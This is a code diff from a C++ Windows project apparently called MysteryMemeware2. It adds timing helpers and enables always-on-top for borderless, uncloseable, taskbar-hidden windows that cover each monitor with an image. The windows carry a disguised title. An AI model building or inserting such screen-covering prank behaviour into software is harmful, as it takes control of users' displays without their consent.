@@ -6,7 +6,19 @@
 #include <iostream>
 #include <vector>
 
-UINT32 OpenWindowCount = 0;
+LONGLONG timerStartTime = 0;
+void TimerStart() {
+	QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&timerStartTime));
+}
+void TimerEnd() {
+	LONGLONG timeNow = 0;
+	QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&timeNow));
+
+	LONGLONG deltaTime = (timeNow - timerStartTime);
+	FLOAT deltaSeconds = deltaTime / 10000000.0f;
+
+	std::cout << "Timer was running for: " << deltaTime << " ticks or " << deltaSeconds << " seconds." << std::endl;
+}
 
 void Update(EZ::Program* program) {
 	ID2D1Bitmap* mysteryImage = *program->GetUserDataAs<ID2D1Bitmap*>();
@@ -15,12 +27,10 @@ void Update(EZ::Program* program) {
 	program->GetRenderer()->DrawBitmap(mysteryImage, rendererRect);
 }
 
+UINT32 OpenWindowCount = 0;
 void CoverMonitor(HMONITOR monitor) {
 	OpenWindowCount++;
 	std::thread monitorThread([monitor]() {
-		LONGLONG startTime = 0;
-		QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&startTime));
-
 		EZ::ClassSettings classSettings = { };
 		classSettings.ThisThreadOnly = TRUE;
 		classSettings.NoCloseOption = TRUE;
@@ -33,7 +43,7 @@ void CoverMonitor(HMONITOR monitor) {
 		windowSettings.HideInTaskbar = TRUE;
 		windowSettings.Title = L"Mystery Experience Host Window";
 		windowSettings.LaunchHidden = TRUE;
-		//windowSettings.TopMost = TRUE;
+		windowSettings.TopMost = TRUE;
 		windowSettings.StylePreset = EZ::WindowStylePreset::Boarderless;
 		windowSettings.InitialX = monitorInfo.rcMonitor.left;
 		windowSettings.InitialY = monitorInfo.rcMonitor.top;
@@ -55,11 +65,6 @@ void CoverMonitor(HMONITOR monitor) {
 		EZ::Program* program = new EZ::Program(programSettings, classSettings, windowSettings, rendererSettings);
 
 		mysteryImage = program->GetRenderer()->LoadBitmap(L"D:\\Coding\\C++\\MysteryMemeware2\\CoverImage.bmp");
-
-		LONGLONG timeNow = 0;
-		QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&timeNow));
-
-		std::cout << "Took: " << (timeNow - startTime) << " ticks for sub thread to finish initializing." << std::endl;
 
 		program->Run();
 
@@ -114,7 +119,11 @@ int main() {
 
 	EZ::Program* program = new EZ::Program(programSettings, classSettings, windowSettings, rendererSettings);
 
+	TimerStart();
+
 	mysteryImage = program->GetRenderer()->LoadBitmap(CoverImage_Asset);
+
+	TimerEnd();
 
 	program->Run();
 
